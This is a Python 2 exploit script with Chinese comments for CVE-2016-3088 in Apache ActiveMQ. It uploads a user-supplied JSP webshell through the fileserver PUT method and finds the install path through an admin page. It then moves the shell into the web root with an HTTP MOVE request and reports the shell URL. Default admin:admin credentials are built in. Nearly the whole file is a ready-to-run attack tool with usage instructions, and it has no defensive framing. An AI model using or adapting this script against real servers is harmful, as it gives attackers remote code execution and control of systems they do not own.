#!/usr/bin/env python
# -*- coding:utf-8 -*-
# ActiveMQ的PUT 上传getshellExP CVE-2016-3088
# Author:CF_HB
# 时间：2016年6月8日
# 漏洞参考地址: http://zone.wooyun.org/content/27737
#

import argparse
from urlparse import urlparse, urlunparse
import time
import socket
import base64
import traceback

banner = u'''\
# ActiveMQ的PUT 上传getshellExP CVE-2016-3088
# Author:CF_HB
# 时间：2016年6月8日
# 漏洞参考地址: http://zone.wooyun.org/content/27737
#1.PUT上去
#2.找到路径
#3.Move Shell

# exp例子：
# 原理参见zone里白帽子刺刺的分析，上传shell用法如下：
    python ActiveMQExP.py -url http://192.168.18.133:8161/ -user admin -pass admin -shell D://shell.jsp
'''

class ActiveMqExpTool():
    def __init__(self):
        self.base_url = ""
        self.AuthBasic = "YWRtaW46YWRtaW4=" # 默认admin:admin
        self.host = "127.0.0.1"
        self.port = 8161
        self.put_file_path = "/fileserver/tmp_2016.txt"
        self.local_shell_path = ""
        self.move_shell_path = ""
        self.get_install_path_url = []
        self.install_path = ""
        self.webshell_path_list = []

        # PUT文件路径
        self.put_file_package = '''\
PUT #put_file_path# HTTP/1.1
Host: 192.168.18.133:8161
Cache-Control: max-age=0
Authorization: Basic #BASE64#
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 1.0; WOW64) Chrome/17.0.2526.106 Safari/5.6
Accept-Encoding: gzip, deflate, sdch
Destination: htt
Accept-Language: zh-CN,zh;q=0.8
If-Modified-Since: Wed, 06 Feb 2013 08:53:26 GMT
Content-Length: #SHELL_LENGTH#

->||<-#ShowMeShell#
'''
        #MOVE文件写shell地址
        self.move_file_package = '''\
MOVE #put_file_path# HTTP/1.1
Host: 192.168.18.133:8161
Cache-Control: max-age=0
Authorization: Basic #BASE64#
Destination:#move_shell_path#

'''
        self.check_file_packege = '''GET check_url HTTP/1.1\r\nHost: *.*.*.*\r\nAuthorization: Basic #BASE64#\r\n\r\n'''
    # 初始化put_fie
    def init_shell_fie(self):
        timetemp = time.time()
        tmp_file_name = str(int(timetemp))
        self.put_file_path = "/fileserver/" + tmp_file_name + ".txt"
        webshell_path_one = "/api/" + tmp_file_name + ".jsp"
        webshell_path_two = "/admin/test/" + tmp_file_name + ".jsp"
        # 在两个地方写shell
        self.webshell_path_list.append(webshell_path_one)
        self.webshell_path_list.append(webshell_path_two)

    def connectsocket(self):
        try:
            socket.setdefaulttimeout(5)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.host, int(self.port))
            sock.connect(server_address)
            return sock
        except Exception,e:
            print "Failed to connection target"
            return None

    def checkfile(self, checkurl):
        try:
            flag = False
            sock = self.connectsocket()
            check_uer_package = self.check_file_packege.replace("check_url", checkurl).replace("#BASE64#", self.AuthBasic)
            sock.sendall(check_uer_package)
            time.sleep(3)
            recv = sock.recv(500)
            # print recv[0:200]
            if "HTTP/1.1 200 OK" in recv or "HTTP/1.1 404 Not Found" not in recv:
                flag = True
            else:
                flag = False
            sock.close()
            return flag
        except Exception, e:
            print "Check File : Wrong"
            print e
            sock.close()

    def deal_path(self, install_path):
        real_install_path = ""
        tmppath = install_path
        # linux系统
        if ":" not in install_path:
            real_install_path = tmppath
        # win系统
        else:
            tmp_list = tmppath.split("\\")
            range_index = len(tmp_list) - (tmppath.count("..")*2)
            for k in range(0, range_index):
                real_install_path = real_install_path + "\\"+tmp_list[k]
            real_install_path = real_install_path[1:]
        # print "real_install_path = "+real_install_path
        return real_install_path

    def getshell(self, url, username, password, shell_path):
        self.username = username
        self.password = password
        self.local_shell_path = shell_path
        urlinfo = urlparse(url)
        self.base_url = urlunparse((urlinfo.scheme, urlinfo.netloc, '', '', '', ''))
        self.host = urlinfo.netloc.split(":")[0]
        self.port = urlinfo.netloc.split(":")[1]
        # 第一步PUT上传文件
        print u"[+]第一步PUT上传文件"
        base64_string = base64.b64encode(self.username+":"+self.password)
        self.AuthBasic = base64_string
        # 利用当前时间戳初始化put上传的文件名和获取的shell文件名
        self.init_shell_fie()
        self.put_file_path = self.base_url+self.put_file_path
        check_url = self.put_file_path
        shellcpntent = open(self.local_shell_path, 'r')
        # 替换下换行
        shellcontent = shellcpntent.read().replace("\n", "")
        put_file_package = self.put_file_package.replace("#put_file_path#", self.put_file_path).replace("#BASE64#", self.AuthBasic).replace("#ShowMeShell#", shellcontent).replace("#SHELL_LENGTH#", str(len(shellcontent)+50))
        sock = self.connectsocket()
        sock.sendall(put_file_package)
        time.sleep(2)
        # put_recv = sock.recv(50)
        sock.close()
        # 检查PUT文件成功了没
        check_url = self.put_file_path
        print "[+]Trying PUT.."+check_url
        if (self.checkfile(check_url)):
            print u"[+]PUT文件成功"
        else:
            print u"[+]PUT文件失败,无法getshell."
            return
        # 第二步找到路径
        print u"[+]寻找Web应用安装路径"
        self.get_install_path_url.append("/admin/test/systemProperties.jsp")
        self.get_install_path_url.append("/admin/test/index.jsp")
        for get_install_path_url in self.get_install_path_url:
            get_install_path_url = self.base_url + get_install_path_url
            try:
                # print "get_install_path_url = "+get_install_path_url
                get_install_path_packege = self.check_file_packege.replace("check_url", get_install_path_url).replace("#BASE64#", self.AuthBasic)
                get_file_sock = self.connectsocket()
                get_file_sock.sendall(get_install_path_packege)
                time.sleep(2)
                # 轮询socket读取数据
                recv =""
                while True:
                    time.sleep(0.2)
                    recv_temp = ""
                    try:
                        recv_temp = get_file_sock.recv(4096)
                        if recv_temp == "":
                            break
                        recv = recv + recv_temp
                        continue
                    except:
                        if recv_temp == "":
                            break
                        else:
                            recv = recv + recv_temp
                            continue
                #5.10.1遇到的新情况
                if "System properties" not in recv:
                    DirIndex = recv.index("activemq.home")
                    endIndex = recv[DirIndex+19:].index("</td>")
                    tempIndex = recv[DirIndex+25:DirIndex+19+endIndex]
                    tempIndex = self.deal_path(tempIndex)
                    break
                else:
                    DirIndex = recv.index("activemq.home")
                    endIndex = recv[DirIndex+14:].index(",")
                    tempIndex = recv[DirIndex+14:DirIndex+14+endIndex]
                    tempIndex = self.deal_path(tempIndex)
                    break
            except:
                continue
        if tempIndex is None:
            print u"寻找Web应用路径失败,请联系CF_HB!!!!"
        else:
            print u"[+]找到安装路径:" + tempIndex
        self.install_path = tempIndex
        path_list = self.install_path.split("\\")
        # print "path_list = ",path_list
        temp_shell_path = ""
        if len(path_list) == 1:
            path_list = self.install_path.split("/")
        temp_shell_path = self.base_url
        for item in path_list[1:]:
            temp_shell_path = temp_shell_path+"/"+item
        temp_shell_path = temp_shell_path + "/webapps"
        # 得到MOVE_PATH
        print u"[+]最后一步,MOVE得到shell"
        for webshell_path in self.webshell_path_list:
            self.move_shell_path = temp_shell_path+webshell_path
            # print self.move_shell_path
            # 最后一步,MOVE得到shell
            move_file_package = self.move_file_package.replace("#put_file_path#", self.put_file_path).replace("#BASE64#", self.AuthBasic).replace("#move_shell_path#", self.move_shell_path)
            move_sock = self.connectsocket()
            move_sock.sendall(move_file_package)
            time.sleep(1)
            web_shell = self.base_url + webshell_path
            if (self.checkfile(web_shell)):
                print u"[getshell success!]"
                print "SHELL: " + web_shell
                exit(0)
            else:
                continue
        print u"MOVE 写入Shell失败，请联系CF_HB!!"

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-url', help='the target url.')
    parser.add_argument('-user', help='username of console.')
    parser.add_argument('-pass', help='password of console.')
    parser.add_argument('-shell', help='your jsp webshell.')

    args = parser.parse_args()
    args_dict = args.__dict__
    try:
        print banner
        amexp = ActiveMqExpTool()
        url = args_dict['url']
        username = args_dict['user']
        password = args_dict['pass']
        shell = args_dict['shell']
        amexp.getshell(url=url, username=username, password=password, shell_path=shell)
    except Exception,e:
        print traceback.print_exc()
        print parser.print_usage()
        exit(-1)